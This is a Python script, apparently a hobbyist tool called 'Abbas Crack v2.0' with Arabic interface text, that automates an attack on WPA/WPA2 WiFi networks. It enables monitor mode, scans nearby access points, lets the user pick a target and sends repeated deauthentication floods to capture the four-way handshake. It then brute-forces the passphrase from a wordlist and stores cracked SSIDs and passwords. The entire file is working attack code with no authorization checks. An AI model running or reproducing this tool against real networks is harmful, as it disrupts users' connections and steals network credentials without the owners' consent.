#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Abbas Crack v2.0 - سكان + اختيار + هجوم + التقاط Handshake + كسر
يقرأ pcap مباشرة · يعمل على Termux و Kali بدون scapy
المبرمج: جنرال عباس 🇮🇶
"""

import os, sys, struct, hmac, hashlib, time, argparse, multiprocessing
import subprocess, re, signal, shutil, json, glob
from datetime import datetime


class C:
    RED='\033[91m'; GREEN='\033[92m'; YELLOW='\033[93m'
    BLUE='\033[94m'; CYAN='\033[96m'; WHITE='\033[97m'
    BOLD='\033[1m'; RESET='\033[0m'; GRAY='\033[90m'
    MAGENTA='\033[95m'


WORK_DIR   = os.path.expanduser("~/abbas_crack")
HS_DIR     = os.path.join(WORK_DIR, "hs")
DUMP_DIR   = os.path.join(WORK_DIR, "dumps")
LOG_FILE   = os.path.join(WORK_DIR, "abbas.log")
STATE_FILE = os.path.join(WORK_DIR, "state.json")
DEFAULT_WL = os.path.join(WORK_DIR, "pass123.txt")

for d in (WORK_DIR, HS_DIR, DUMP_DIR):
    os.makedirs(d, exist_ok=True)


def log(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(line + "\n")


def banner():
    print(f"""
{C.CYAN}╔══════════════════════════════════════════════════════════════╗
║  {C.RED}🔓 Abbas Crack v2.0  -  سكان + هجوم + كسر{C.CYAN}                   ║
║  {C.WHITE}يقرأ pcap مباشرة · يعمل على Termux و Kali{C.CYAN}                 ║
║  {C.YELLOW}المبرمج: جنرال عباس 🇮🇶{C.CYAN}                                    ║
╚══════════════════════════════════════════════════════════════╝{C.RESET}
""")


# ================= UTIL SHELL =================

def run(cmd, timeout=None, capture=True):
    log(f"run: {' '.join(cmd) if isinstance(cmd, list) else cmd}")
    try:
        r = subprocess.run(cmd, shell=isinstance(cmd, str),
                           capture_output=capture, text=True, timeout=timeout)
        return r.returncode, r.stdout or "", r.stderr or ""
    except subprocess.TimeoutExpired:
        return 124, "", "timeout"
    except Exception as e:
        return 1, "", str(e)


def have(tool):
    return shutil.which(tool) is not None


# ================= قارئ pcap =================

def read_pcap(filepath):
    with open(filepath, 'rb') as f:
        data = f.read()
    if len(data) < 24:
        raise ValueError("الملف صغير جداً")
    magic = data[0:4]
    m_le = struct.unpack('<I', magic)[0]
    m_be = struct.unpack('>I', magic)[0]
    if m_le in (0xa1b2c3d4, 0xa1b23c4d):
        endian = '<'
    elif m_be in (0xa1b2c3d4, 0xa1b23c4d):
        endian = '>'
    elif m_le in (0xd4c3b2a1, 0x4d3cb2a1):
        endian = '>'
    elif m_be in (0xd4c3b2a1, 0x4d3cb2a1):
        endian = '<'
    else:
        raise ValueError(f"ليس pcap صالح (magic={magic.hex()})")

    linktype = struct.unpack(endian + 'I', data[20:24])[0]
    packets = []
    off = 24
    while off + 16 <= len(data):
        incl_len = struct.unpack(endian + 'I', data[off+8:off+12])[0]
        off += 16
        if off + incl_len > len(data):
            break
        packets.append(data[off:off+incl_len])
        off += incl_len
    return linktype, packets


# ================= تحليل 802.11 =================

def strip_radiotap(pkt):
    if len(pkt) < 8:
        return None
    it_len = struct.unpack('<H', pkt[2:4])[0]
    if it_len > len(pkt) or it_len < 8:
        return None
    return pkt[it_len:]


def dot11_fc(frame):
    if len(frame) < 2:
        return None, None
    fc = struct.unpack('<H', frame[0:2])[0]
    return (fc >> 2) & 0x3, (fc >> 4) & 0xf


def get_ssid(frame):
    ftype, subtype = dot11_fc(frame)
    if ftype != 0 or subtype not in (5, 8):
        return None
    if len(frame) < 36:
        return None
    tags = frame[36:]
    i = 0
    while i + 2 <= len(tags):
        tid = tags[i]; tlen = tags[i+1]
        if i + 2 + tlen > len(tags):
            break
        if tid == 0:
            return bytes(tags[i+2:i+2+tlen])
        i += 2 + tlen
    return None


def extract_eapol(frame):
    ftype, subtype = dot11_fc(frame)
    if ftype != 2:
        return None
    fc = struct.unpack('<H', frame[0:2])[0]
    to_ds = (fc >> 8) & 1
    from_ds = (fc >> 9) & 1
    hdr = 24
    if subtype & 0x8:
        hdr += 2
    if to_ds and from_ds:
        hdr += 6
    if len(frame) < hdr + 8:
        return None
    llc = frame[hdr:hdr+8]
    if llc[:6] != b'\xaa\xaa\x03\x00\x00\x00':
        return None
    if llc[6:8] != b'\x88\x8e':
        return None
    return frame[hdr+8:], frame


def parse_eapol_key(eapol):
    if len(eapol) < 99:
        return None
    if eapol[1] != 3:
        return None
    body = eapol[4:]
    if len(body) < 95:
        return None
    key_info = struct.unpack('>H', body[1:3])[0]
    key_ack = (key_info >> 7) & 1
    key_mic = (key_info >> 8) & 1
    nonce = body[13:45]
    mic = body[77:93]
    eapol_len = struct.unpack('>H', eapol[2:4])[0]
    total = min(4 + eapol_len, len(eapol))
    return {
        'raw': eapol[:total],
        'key_ack': key_ack,
        'key_mic': key_mic,
        'nonce': nonce,
        'mic': mic,
    }


def parse_handshake(filepath, quiet=False):
    if not quiet:
        print(f"{C.BLUE}[*] قراءة الملف: {filepath}{C.RESET}")
    try:
        linktype, packets = read_pcap(filepath)
    except Exception as e:
        print(f"{C.RED}❌ فشل: {e}{C.RESET}")
        return None
    if not quiet:
        print(f"{C.GREEN}[+] عدد الحزم: {len(packets)} (linktype={linktype}){C.RESET}")

    ssid = None
    m1_list, m2_list = [], []

    for pkt in packets:
        frame = pkt
        if linktype == 127:
            frame = strip_radiotap(pkt)
            if frame is None:
                continue
        if not ssid:
            s = get_ssid(frame)
            if s:
                ssid = s
        res = extract_eapol(frame)
        if not res:
            continue
        eapol, full = res
        parsed = parse_eapol_key(eapol)
        if not parsed or len(full) < 16:
            continue
        addr1 = full[4:10]
        addr2 = full[10:16]
        if parsed['key_ack'] and not parsed['key_mic']:
            m1_list.append({'nonce': parsed['nonce'], 'ap': addr2, 'sta': addr1, 'eapol': parsed['raw']})
        elif parsed['key_mic'] and not parsed['key_ack']:
            m2_list.append({'nonce': parsed['nonce'], 'sta': addr2, 'ap': addr1,
                            'mic': parsed['mic'], 'eapol': parsed['raw']})

    if not quiet:
        print(f"{C.GRAY}   M1: {len(m1_list)}  M2: {len(m2_list)}{C.RESET}")

    if not ssid or not m1_list or not m2_list:
        if not quiet:
            print(f"{C.RED}❌ Handshake غير مكتمل.{C.RESET}")
        return None

    ap_mac = sta_mac = anonce = snonce = mic = eapol_m2 = None
    for m1 in m1_list:
        for m2 in m2_list:
            if m1['ap'] == m2['ap'] and m1['sta'] == m2['sta']:
                ap_mac = m1['ap']; sta_mac = m1['sta']
                anonce = m1['nonce']; snonce = m2['nonce']
                mic = m2['mic']; eapol_m2 = m2['eapol']
                break
        if ap_mac:
            break

    if not ap_mac:
        if not quiet:
            print(f"{C.RED}❌ لم يتم مطابقة M1 مع M2.{C.RESET}")
        return None

    if not quiet:
        print(f"{C.GREEN}[+] SSID: {ssid.decode('utf-8', errors='ignore')}{C.RESET}")
        print(f"{C.GREEN}[+] AP MAC: {ap_mac.hex(':')}{C.RESET}")
        print(f"{C.GREEN}[+] STA MAC: {sta_mac.hex(':')}{C.RESET}")

    mac1, mac2 = sorted([ap_mac, sta_mac])
    n1, n2 = sorted([anonce, snonce])
    return {'ssid': ssid, 'mac1': mac1, 'mac2': mac2,
            'nonce1': n1, 'nonce2': n2, 'mic': mic, 'eapol': eapol_m2}


# ================= العمليات الحسابية =================

_G = {}

def _init(hs):
    global _G
    _G = hs

def compute_pmk(pw, ssid):
    return hashlib.pbkdf2_hmac('sha1', pw, ssid, 4096, 32)

def compute_ptk(pmk, mac1, mac2, n1, n2):
    data = mac1 + mac2 + n1 + n2
    ptk = b''
    for i in range(4):
        ptk += hmac.new(pmk, b"Pairwise key expansion\x00" + data + bytes([i]), hashlib.sha1).digest()
    return ptk[:64]

def check_pw(pw):
    try:
        pmk = compute_pmk(pw, _G['ssid'])
        ptk = compute_ptk(pmk, _G['mac1'], _G['mac2'], _G['nonce1'], _G['nonce2'])
        frame = bytearray(_G['eapol'])
        for i in range(81, 97):
            frame[i] = 0
        comp = hmac.new(ptk[:16], bytes(frame), hashlib.sha1).digest()[:16]
        if hmac.compare_digest(comp, _G['mic']):
            return pw
    except Exception:
        pass
    return None


# ================= كسر Handshake =================

def crack(hs, wl_path, workers=None, single=False, wl_text=None):
    if wl_text is None:
        if not os.path.exists(wl_path):
            print(f"{C.RED}❌ Wordlist غير موجود: {wl_path}{C.RESET}")
            return None
        with open(wl_path, 'rb') as f:
            passwords = [l.strip() for l in f if l.strip()]
    else:
        passwords = wl_text
    total = len(passwords)
    print(f"{C.GREEN}[+] الكلمات: {total:,}{C.RESET}")

    if single or total < 100:
        workers = 1
    elif workers is None:
        try:
            workers = max(1, multiprocessing.cpu_count() - 1)
        except Exception:
            workers = 1
    print(f"{C.GREEN}[+] المعالجات: {workers}{C.RESET}\n")

    start = time.time()
    found = None
    tested = 0

    print(f"{C.CYAN}═══════════════════════════════════════════════{C.RESET}")

    try:
        if workers == 1:
            _init(hs)
            for pw in passwords:
                tested += 1
                r = check_pw(pw)
                if r:
                    found = r
                    break
                if tested % 500 == 0:
                    _show_progress(tested, total, start)
        else:
            with multiprocessing.Pool(workers, initializer=_init, initargs=(hs,)) as pool:
                for r in pool.imap_unordered(check_pw, passwords, chunksize=200):
                    tested += 1
                    if r:
                        found = r
                        pool.terminate()
                        break
                    if tested % 500 == 0:
                        _show_progress(tested, total, start)
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}⏹️ تم الإيقاف.{C.RESET}")
        return None
    except Exception as e:
        print(f"\n{C.YELLOW}⚠️ multiprocessing فشل: {e} — وضع مفرد{C.RESET}")
        _init(hs)
        for pw in passwords[tested:]:
            tested += 1
            r = check_pw(pw)
            if r:
                found = r
                break
            if tested % 500 == 0:
                _show_progress(tested, total, start)

    print()
    elapsed = time.time() - start
    print(f"{C.CYAN}═══════════════════════════════════════════════{C.RESET}")

    if found:
        pwd = found.decode('utf-8', errors='ignore')
        print(f"\n{C.GREEN}{C.BOLD}╔═══════════════════════════════════════╗")
        print(f"║  ✅ كلمة السر: {pwd}")
        print(f"╚═══════════════════════════════════════╝{C.RESET}")
        print(f"{C.WHITE}🌐 الشبكة: {C.CYAN}{hs['ssid'].decode('utf-8', errors='ignore')}{C.RESET}")
        print(f"{C.WHITE}🔑 Password: {C.GREEN}{C.BOLD}{pwd}{C.RESET}")
        print(f"{C.WHITE}⏱️ الوقت: {C.YELLOW}{elapsed:.1f}s{C.RESET}")
        print(f"{C.WHITE}📊 حاولنا: {C.YELLOW}{tested:,}{C.RESET}")
        log(f"CRACKED ssid={hs['ssid'].decode('utf-8', errors='ignore')} pwd={pwd} tested={tested}")
        return pwd
    else:
        print(f"\n{C.RED}{C.BOLD}❌ لم يتم العثور على كلمة السر{C.RESET}")
        print(f"{C.WHITE}📊 حاولنا: {C.YELLOW}{tested:,}{C.RESET}")
        print(f"{C.WHITE}⏱️ الوقت: {C.YELLOW}{elapsed:.1f}s{C.RESET}")
        return None


def _show_progress(tested, total, start):
    elapsed = time.time() - start
    speed = tested / elapsed if elapsed > 0 else 0
    remaining = (total - tested) / speed if speed > 0 else 0
    percent = (tested / total) * 100
    filled = int(40 * percent / 100)
    bar = '█' * filled + '░' * (40 - filled)
    print(f"\r{C.YELLOW}[{bar}] {percent:.1f}% | {tested:,}/{total:,} | "
          f"{speed:,.0f} H/s | متبقي: {int(remaining)}s{C.RESET}", end='')


# ================= إدارة الواجهة =================

def detect_monitor_iface():
    """إرجاع اسم واجهة monitor mode."""
    rc, out, _ = run(["iw", "dev"])
    if rc != 0:
        return None
    cur = None
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("Interface "):
            cur = line.split()[1]
        elif line == "type monitor" and cur:
            return cur
    return None


def detect_managed_iface():
    """إرجاع واجهة managed جاهزة."""
    rc, out, _ = run(["iw", "dev"])
    if rc != 0:
        return None
    cur = None
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("Interface "):
            cur = line.split()[1]
        elif line == "type managed" and cur:
            return cur
    # fallback: nmcli
    rc, out, _ = run(["nmcli", "-t", "-f", "DEVICE,TYPE", "device", "status"])
    for line in out.splitlines():
        if "wifi" in line:
            return line.split(":")[0]
    return None


def enable_monitor(base_iface=None):
    iface = detect_monitor_iface()
    if iface:
        print(f"{C.GREEN}[+] Monitor mode already active: {iface}{C.RESET}")
        return iface
    if base_iface is None:
        base_iface = detect_managed_iface()
    if not base_iface:
        print(f"{C.RED}❌ لم أجد واجهة WiFi. شغّل: iw dev{C.RESET}")
        return None
    print(f"{C.BLUE}[*] تفعيل monitor mode على {base_iface}...{C.RESET}")
    run(["airmon-ng", "check", "kill"])
    rc, out, err = run(["airmon-ng", "start", base_iface])
    print(out)
    iface = detect_monitor_iface()
    if not iface:
        # بعض التعريفات (rtl8187) تحوّل الواجهة نفسها
        rc, out, _ = run(["iw", "dev", base_iface, "info"])
        if "type monitor" in out:
            iface = base_iface
    return iface


def disable_monitor(iface):
    run(["airmon-ng", "stop", iface])
    run(["systemctl", "restart", "NetworkManager"])
    print(f"{C.GREEN}[+] Monitor mode off.{C.RESET}")


# ================= سكان الشبكات =================

def scan_networks(iface, duration=25):
    """سكان بـairodump-ng، إرجاع قائمة الشبكات."""
    print(f"{C.BLUE}[*] سكان {duration}s على {iface}...{C.RESET}")
    out_csv = os.path.join(DUMP_DIR, f"scan_{int(time.time())}")
    cmd = ["timeout", str(duration), "airodump-ng",
           "--output-format", "csv", "-w", out_csv, iface]
    run(cmd, timeout=duration + 8)

    csv_files = glob.glob(out_csv + "*.csv")
    if not csv_files:
        print(f"{C.RED}❌ لم يتم إنتاج ملف سكان.{C.RESET}")
        return []
    fpath = csv_files[0]

    aps = []
    with open(fpath, encoding="utf-8", errors="ignore") as f:
        lines = f.readlines()

    in_ap = False
    for line in lines:
        stripped = line.strip()
        if stripped.startswith("BSSID"):
            in_ap = True
            continue
        if stripped.startswith("Station MAC"):
            in_ap = False
            continue
        if not in_ap or not stripped:
            continue
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 14:
            continue
        bssid = parts[0]
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
            continue
        try:
            channel = int(parts[3]) if parts[3].isdigit() else 0
            power   = int(parts[8]) if parts[8].lstrip("-").isdigit() else -100
        except ValueError:
            channel, power = 0, -100
        enc = parts[5]
        cipher = parts[6]
        auth = parts[7]
        essid = parts[13]
        aps.append({
            "bssid": bssid,
            "channel": channel,
            "power": power,
            "encryption": enc,
            "cipher": cipher,
            "auth": auth,
            "essid": essid or "<hidden>",
        })

    aps.sort(key=lambda x: x["power"], reverse=True)
    return aps


def display_networks(aps):
    if not aps:
        print(f"{C.RED}❌ لا شبكات.{C.RESET}")
        return
    print(f"\n{C.CYAN}{'#':<4}{'PWR':<6}{'CH':<4}{'ENC':<10}{'BSSID':<20}SSID{C.RESET}")
    print(f"{C.GRAY}{'-'*72}{C.RESET}")
    for i, ap in enumerate(aps, 1):
        color = C.GREEN if ap["power"] > -60 else (C.YELLOW if ap["power"] > -75 else C.GRAY)
        print(f"{color}{i:<4}{ap['power']:<6}{ap['channel']:<4}"
              f"{ap['encryption']:<10}{ap['bssid']:<20}{ap['essid']}{C.RESET}")
    print()


# ================= هجوم Deauth + التقاط =================

def capture_handshake(iface, bssid, channel, essid, timeout=90):
    """يشغّل airodump على القناة، ويرسل deauth، ينتظر handshake."""
    safe = re.sub(r"[^\w.-]", "_", essid or "unknown")[:32]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    prefix = os.path.join(HS_DIR, f"handshake_{safe}_{bssid.replace(':','-')}_{ts}")

    print(f"{C.BLUE}[*] airodump على ch={channel} bssid={bssid}{C.RESET}")
    ad_cmd = ["airodump-ng", "-c", str(channel), "--bssid", bssid,
              "-w", prefix, "--output-format", "pcap", iface]
    ad = subprocess.Popen(ad_cmd, stdout=subprocess.DEVNULL,
                          stderr=subprocess.DEVNULL)

    time.sleep(4)  # خلي airodump يبدأ

    print(f"{C.BLUE}[*] deauth flood على {bssid}...{C.RESET}")
    start = time.time()
    captured = None
    cap_file = prefix + "-01.cap"

    # deauth دوري (3 مرات × 10 حزم)
    for round_i in range(1, 6):
        if time.time() - start > timeout:
            break
        run(["aireplay-ng", "--deauth", "10", "-a", bssid, iface], timeout=15)
        print(f"{C.GRAY}   round {round_i} — فحص الحزم...{C.RESET}")

        for _ in range(15):
            time.sleep(1)
            if os.path.exists(cap_file):
                hs = parse_handshake(cap_file, quiet=True)
                if hs:
                    captured = cap_file
                    break
        if captured:
            break

    ad.send_signal(signal.SIGINT)
    try:
        ad.wait(timeout=8)
    except subprocess.TimeoutExpired:
        ad.kill()

    if captured and os.path.exists(captured):
        print(f"{C.GREEN}[+] Handshake: {captured}{C.RESET}")
        log(f"CAPTURED {captured}")
        return captured
    print(f"{C.RED}❌ فشل التقاط Handshake.{C.RESET}")
    return None


# ================= Pipeline كامل =================

def load_state():
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE) as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_state(d):
    with open(STATE_FILE, "w") as f:
        json.dump(d, f, indent=2, ensure_ascii=False)


def interactive_pipeline(iface=None, wl_path=DEFAULT_WL, scan_time=25,
                          attack_timeout=120, workers=None, single=False):
    banner()

    for tool in ("airodump-ng", "aireplay-ng"):
        if not have(tool):
            print(f"{C.RED}❌ الأداة {tool} غير مثبتة. ثبّت aircrack-ng suite.{C.RESET}")
            return

    # 1. Monitor mode
    if iface is None:
        iface = enable_monitor()
    if not iface:
        return
    print(f"{C.GREEN}[+] Interface: {iface}{C.RESET}")

    # 2. سكان
    aps = scan_networks(iface, duration=scan_time)
    if not aps:
        return
    display_networks(aps)

    # 3. اختيار
    while True:
        try:
            sel = input(f"{C.CYAN}اختر رقم الشبكة (أو q للخروج): {C.RESET}").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if sel.lower() in ("q", "quit", "exit"):
            return
        if sel.isdigit() and 1 <= int(sel) <= len(aps):
            target = aps[int(sel) - 1]
            break
        print(f"{C.RED}رقم غير صالح.{C.RESET}")

    print(f"\n{C.MAGENTA}[*] الهدف: {target['essid']} ({target['bssid']}) "
          f"ch={target['channel']} pwr={target['power']}{C.RESET}")

    if "WPA" not in target["encryption"].upper() and "WPA2" not in target["encryption"].upper():
        print(f"{C.YELLOW}⚠️ التشفير {target['encryption']} — غير مدعوم للكسر.{C.RESET}")
        return

    # 4. التقاط handshake
    cap_file = capture_handshake(iface, target["bssid"], target["channel"],
                                  target["essid"], timeout=attack_timeout)
    if not cap_file:
        return

    # 5. تخزين المسار
    state = load_state()
    state.setdefault("captures", []).append({
        "file": cap_file,
        "essid": target["essid"],
        "bssid": target["bssid"],
        "channel": target["channel"],
        "ts": datetime.now().isoformat(),
    })
    save_state(state)

    # 6. كسر أوتوماتيكي
    hs = parse_handshake(cap_file)
    if not hs:
        return

    # 7. Wordlist — pass123.txt
    if not os.path.exists(wl_path):
        print(f"{C.YELLOW}⚠️ {wl_path} غير موجود. أنشئه أولاً.{C.RESET}")
        print(f"{C.GRAY}    مثال: echo -e '12345678\\npassword\\n...' > {wl_path}{C.RESET}")
        return

    print(f"\n{C.CYAN}[*] بدء الكسر بـ {wl_path}{C.RESET}")
    pwd = crack(hs, wl_path, workers=workers, single=single)

    if pwd:
        result_path = os.path.join(WORK_DIR, "cracked.json")
        try:
            data = json.load(open(result_path)) if os.path.exists(result_path) else []
        except Exception:
            data = []
        data.append({
            "essid": target["essid"],
            "bssid": target["bssid"],
            "pwd": pwd,
            "capture": cap_file,
            "ts": datetime.now().isoformat(),
        })
        with open(result_path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        print(f"{C.GREEN}[+] محفوظ في: {result_path}{C.RESET}")


# ================= CLI =================

def main():
    p = argparse.ArgumentParser(description="Abbas Crack v2.0 — سكان + هجوم + كسر")
    sub = p.add_subparsers(dest="cmd")

    sub.add_parser("interactive", help="Pipeline كامل تفاعلي")
    sub.add_parser("scan", help="سكان فقط")

    cap = sub.add_parser("capture", help="التقاط Handshake لـ BSSID محدد")
    cap.add_argument("bssid")
    cap.add_argument("channel", type=int)
    cap.add_argument("--essid", default="target")
    cap.add_argument("--timeout", type=int, default=120)

    crk = sub.add_parser("crack", help="كسر Handshake موجود")
    crk.add_argument("handshake")
    crk.add_argument("wordlist", nargs="?", default=DEFAULT_WL)
    crk.add_argument("-j", "--workers", type=int, default=None)
    crk.add_argument("--single", action="store_true")

    p.add_argument("--iface", default=None)
    p.add_argument("--wordlist", default=DEFAULT_WL)
    p.add_argument("--scan-time", type=int, default=25)
    p.add_argument("--attack-timeout", type=int, default=120)
    p.add_argument("-j", "--workers", type=int, default=None)
    p.add_argument("--single", action="store_true")

    a = p.parse_args()

    if a.cmd == "scan":
        iface = a.iface or enable_monitor()
        if iface:
            aps = scan_networks(iface, duration=a.scan_time)
            display_networks(aps)
        return

    if a.cmd == "capture":
        iface = a.iface or enable_monitor()
        if not iface:
            return
        cap = capture_handshake(iface, a.bssid, a.channel, a.essid, timeout=a.timeout)
        if cap:
            print(f"{C.GREEN}[+] {cap}{C.RESET}")
        return

    if a.cmd == "crack":
        hs = parse_handshake(a.handshake)
        if hs:
            crack(hs, a.wordlist, a.workers, a.single)
        return

    # default: interactive
    interactive_pipeline(
        iface=a.iface,
        wl_path=a.wordlist,
        scan_time=a.scan_time,
        attack_timeout=a.attack_timeout,
        workers=a.workers,
        single=a.single,
    )


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}⏹️ تم الإيقاف.{C.RESET}")
    except Exception as e:
        print(f"\n{C.RED}❌ خطأ: {e}{C.RESET}")
